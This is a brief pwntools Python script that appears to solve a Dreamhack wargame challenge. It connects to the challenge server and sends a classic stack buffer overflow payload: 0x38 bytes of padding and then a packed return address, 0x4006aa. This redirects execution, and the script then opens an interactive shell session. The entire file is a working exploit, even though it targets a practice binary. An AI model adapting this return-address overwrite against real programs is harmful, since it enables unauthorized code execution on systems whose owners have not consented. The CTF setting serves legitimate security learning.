from pwn import context, process, remote, p64
from os import getcwd

context.log_level = "debug"
REMOTE = True

if REMOTE:
 p = remote("host3.dreamhack.games",18049)
else:
 p = process(f"fish -c '{getcwd()}/a/rao'", shell=True)

p.readuntil(b":")
code = b'a'*0x38+p64(0x00000000004006aa)
#'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xaa\x06\x00\x00\x00\x00\x00'
print(code)
p.send(code)
#p.send(b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xaa\x06\x00\x00\x00\x00\x00")
p.interactive()
